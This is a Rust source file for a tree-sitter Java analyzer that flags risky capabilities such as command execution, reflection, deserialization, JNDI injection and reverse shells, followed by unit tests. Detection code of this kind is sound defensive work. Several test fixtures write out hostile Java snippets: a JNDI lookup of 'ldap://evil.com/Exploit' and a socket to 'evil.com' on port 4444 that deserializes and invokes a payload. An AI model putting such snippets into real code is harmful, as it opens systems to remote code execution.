use crate::analyzers::Analyzer;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Java analyzer using tree-sitter
pub struct JavaAnalyzer {
    parser: RefCell<Parser>,
}

impl JavaAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_java::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the Java source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse Java source")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "java".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/java".to_string(),
            description: "Java source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-java".to_string(),
                value: "java".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        // Detect capabilities and patterns
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-java".to_string()];

        Ok(report)
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "method_invocation" => {
                    self.analyze_call(&node, source, report);
                }
                "import_declaration" => {
                    self.analyze_import(&node, source, report);
                }
                "object_creation_expression" => {
                    self.analyze_object_creation(&node, source, report);
                }
                _ => {}
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            // Command execution (critical for Java)
            if text.contains("Runtime.exec") || text.contains(".exec(") {
                capabilities.push((
                    "exec/command/shell",
                    "Runtime.exec() command execution",
                    "Runtime.exec",
                    0.95,
                    Criticality::Notable,
                ));
            }

            // Reflection (major attack vector)
            if text.contains("Class.forName") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Dynamic class loading",
                    "Class.forName",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("Method.invoke") || text.contains(".invoke(") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Dynamic method invocation",
                    "Method.invoke",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains(".setAccessible") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Bypass access control",
                    "setAccessible",
                    0.95,
                    Criticality::Notable,
                ));
            }
            if text.contains(".getDeclaredMethod") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Get private method",
                    "getDeclaredMethod",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Deserialization (Log4Shell-style)
            if text.contains("ObjectInputStream") || text.contains(".readObject(") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "Object deserialization",
                    "ObjectInputStream",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("XMLDecoder") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "XML deserialization",
                    "XMLDecoder",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // JNDI injection (Log4Shell vector)
            if (text.contains(".lookup(") || text.contains("InitialContext"))
                && (text.contains("ldap://") || text.contains("rmi://"))
            {
                capabilities.push((
                    "jndi/injection",
                    "JNDI injection pattern",
                    "lookup+ldap/rmi",
                    0.95,
                    Criticality::Hostile,
                ));
            }

            // JNI/Native methods
            if text.contains("System.loadLibrary") || text.contains("System.load") {
                capabilities.push((
                    "exec/dylib/load",
                    "Native library loading",
                    "System.loadLibrary",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Reverse shell pattern
            if (text.contains("Socket") || text.contains("connect"))
                && (text.contains("Runtime.exec")
                    || text.contains("ProcessBuilder")
                    || text.contains("/bin/sh"))
            {
                capabilities.push((
                    "c2/reverse-shell",
                    "Reverse shell connection",
                    "Socket+exec",
                    0.98,
                    Criticality::Hostile,
                ));
            }

            // ClassLoader manipulation (supply chain risk)
            if text.contains("URLClassLoader") || text.contains(".defineClass") {
                capabilities.push((
                    "exec/classloader",
                    "Dynamic class loading",
                    "ClassLoader",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Script execution
            if text.contains("ScriptEngine") || text.contains("ScriptEngineManager") {
                capabilities.push((
                    "exec/script",
                    "Script engine execution",
                    "ScriptEngine",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Add capabilities
            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.capabilities.push(Capability {
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                });
            }
        }
    }

    fn analyze_import(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            if text.contains("java.lang.Runtime") || text.contains("java.lang.ProcessBuilder") {
                capabilities.push((
                    "exec/command/shell",
                    "Process execution import",
                    "Runtime/ProcessBuilder",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("java.lang.reflect") {
                capabilities.push((
                    "anti-analysis/reflection",
                    "Reflection import",
                    "reflect",
                    0.7,
                    Criticality::Notable,
                ));
            }
            if text.contains("java.io.ObjectInputStream") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "Deserialization import",
                    "ObjectInputStream",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("javax.naming") {
                capabilities.push((
                    "jndi/import",
                    "JNDI import (injection risk)",
                    "javax.naming",
                    0.75,
                    Criticality::Notable,
                ));
            }
            if text.contains("com.thoughtworks.xstream") {
                capabilities.push((
                    "anti-analysis/deserialization",
                    "XStream deserialization",
                    "xstream",
                    0.85,
                    Criticality::Notable,
                ));
            }

            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.capabilities.push(Capability {
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "import".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                });
            }
        }
    }

    fn analyze_object_creation(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            if text.contains("ProcessBuilder") {
                capabilities.push((
                    "exec/command/shell",
                    "ProcessBuilder creation",
                    "ProcessBuilder",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("Socket") {
                capabilities.push((
                    "net/socket/create",
                    "Socket creation",
                    "Socket",
                    0.85,
                    Criticality::Notable,
                ));
            }
            if text.contains("URLClassLoader") {
                capabilities.push((
                    "exec/classloader",
                    "URL class loader",
                    "URLClassLoader",
                    0.9,
                    Criticality::Notable,
                ));
            }

            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.capabilities.push(Capability {
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-java".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                    traits: Vec::new(),
                    referenced_paths: None,
                    referenced_directories: None,
                });
            }
        }
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            if node.kind() == "method_declaration" {
                if let Ok(text) = node.utf8_text(source) {
                    // Extract method name
                    let name = self
                        .extract_function_name(&node, source)
                        .unwrap_or_else(|| "anonymous".to_string());

                    // Check for native methods
                    if text.contains("native ") {
                        report.capabilities.push(Capability {
                            id: "jni/native-method".to_string(),
                            description: format!("Native method: {}", name),
                            confidence: 0.95,
                            criticality: Criticality::Notable,

                            mbc: None,

                            attack: None,

                            evidence: vec![Evidence {
                                method: "ast".to_string(),
                                source: "tree-sitter-java".to_string(),
                                value: "native".to_string(),
                                location: Some(format!(
                                    "{}:{}",
                                    node.start_position().row,
                                    node.start_position().column
                                )),
                            }],
                            traits: Vec::new(),
                            referenced_paths: None,
                            referenced_directories: None,
                        });
                    }

                    report.functions.push(Function {
                        name,
                        offset: Some(format!("0x{:x}", node.start_byte())),
                        size: Some((node.end_byte() - node.start_byte()) as u64),
                        complexity: None,
                        calls: Vec::new(),
                        source: "tree-sitter-java".to_string(),
                        control_flow: None,
                        instruction_analysis: None,
                        register_usage: None,
                        constants: Vec::new(),
                        properties: None,
                        signature: None,
                        nesting: None,
                        call_patterns: None,
                    });
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_for_functions(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for JavaAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path)?;
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("java")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_java_code(code: &str) -> AnalysisReport {
        let analyzer = JavaAnalyzer::new();
        let path = PathBuf::from("test.java");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_can_analyze_java_extension() {
        let analyzer = JavaAnalyzer::new();
        assert!(analyzer.can_analyze(&PathBuf::from("test.java")));
        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/Main.java")));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = JavaAnalyzer::new();
        assert!(!analyzer.can_analyze(&PathBuf::from("test.class")));
        assert!(!analyzer.can_analyze(&PathBuf::from("test.jar")));
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
public class Test {
    public static void main(String[] args) {
        System.out.println("Hello");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/java"));
    }

    #[test]
    fn test_detect_runtime_exec() {
        let code = r#"
import java.io.IOException;
public class Exec {
    public void runCommand() throws IOException {
        Runtime.getRuntime().exec("whoami");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/command/shell"));
        assert!(report
            .capabilities
            .iter()
            .filter(|c| c.id == "exec/command/shell")
            .any(|c| c.confidence >= 0.9));
    }

    #[test]
    fn test_detect_processbuilder_creation() {
        let code = r#"
import java.io.IOException;
public class PB {
    public void run() throws IOException {
        new ProcessBuilder("ls", "-la").start();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_reflection_class_forname() {
        let code = r#"
public class Reflect {
    public void load() throws Exception {
        Class.forName("com.evil.Payload").newInstance();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_reflection_method_invoke() {
        let code = r#"
import java.lang.reflect.Method;
public class Invoke {
    public void call() throws Exception {
        Method method = obj.getClass().getMethod("exec");
        method.invoke(obj, args);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_reflection_setaccessible() {
        let code = r#"
import java.lang.reflect.Field;
public class Access {
    public void bypass() throws Exception {
        Field field = clazz.getDeclaredField("privateField");
        field.setAccessible(true);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_detect_deserialization() {
        let code = r#"
import java.io.ObjectInputStream;
public class Deserial {
    public Object load(InputStream in) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in);
        return ois.readObject();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_xmldecoder() {
        let code = r#"
import java.beans.XMLDecoder;
public class XmlD {
    public void parse() {
        XMLDecoder decoder = new XMLDecoder(in);
        decoder.readObject();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_jndi_injection() {
        let code = r#"
import javax.naming.InitialContext;
public class JNDI {
    public void exploit() throws Exception {
        InitialContext ctx = new InitialContext();
        ctx.lookup("ldap://evil.com/Exploit");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "jndi/injection"));
    }

    #[test]
    fn test_detect_native_library_load() {
        let code = r#"
public class Native {
    static {
        System.loadLibrary("evil");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/dylib/load"));
    }

    #[test]
    fn test_detect_urlclassloader() {
        let code = r#"
import java.net.URLClassLoader;
public class Loader {
    public void load() throws Exception {
        URLClassLoader loader = new URLClassLoader(urls);
        Class clazz = loader.loadClass("Evil");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "exec/classloader"));
    }

    #[test]
    fn test_detect_script_engine() {
        let code = r#"
public class Script {
    public void run() throws Exception {
        Object engine = getScriptEngineManager().getEngine();
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "exec/script"));
    }

    #[test]
    fn test_detect_socket_creation() {
        let code = r#"
import java.net.Socket;
public class Network {
    public void connect() throws Exception {
        Socket socket = new Socket("evil.com", 4444);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_native_method() {
        let code = r#"
public class JNI {
    public native void executeShellcode(byte[] code);

    static {
        System.loadLibrary("malware");
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "jni/native-method"));
    }

    #[test]
    fn test_extract_methods() {
        let code = r#"
public class Methods {
    public void method1() {
    }

    private int method2(String arg) {
        return 0;
    }
}
"#;
        let report = analyze_java_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "method1"));
        assert!(report.functions.iter().any(|f| f.name == "method2"));
    }

    #[test]
    fn test_import_reflection_package() {
        let code = r#"
import java.lang.reflect.Method;
public class Test {
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
    }

    #[test]
    fn test_import_jndi_package() {
        let code = r#"
import javax.naming.InitialContext;
public class Test {
}
"#;
        let report = analyze_java_code(code);
        assert!(report.capabilities.iter().any(|c| c.id == "jndi/import"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
import java.lang.reflect.Method;
import java.io.ObjectInputStream;
import java.net.Socket;
public class MultiThreat {
    public void exploit() throws Exception {
        Socket s = new Socket("evil.com", 4444);
        ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
        Object payload = ois.readObject();
        Method m = payload.getClass().getMethod("exec");
        m.invoke(payload);
    }
}
"#;
        let report = analyze_java_code(code);
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "net/socket/create"));
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
        assert!(report
            .capabilities
            .iter()
            .any(|c| c.id == "anti-analysis/reflection"));
        assert!(report.capabilities.len() >= 3);
    }
}
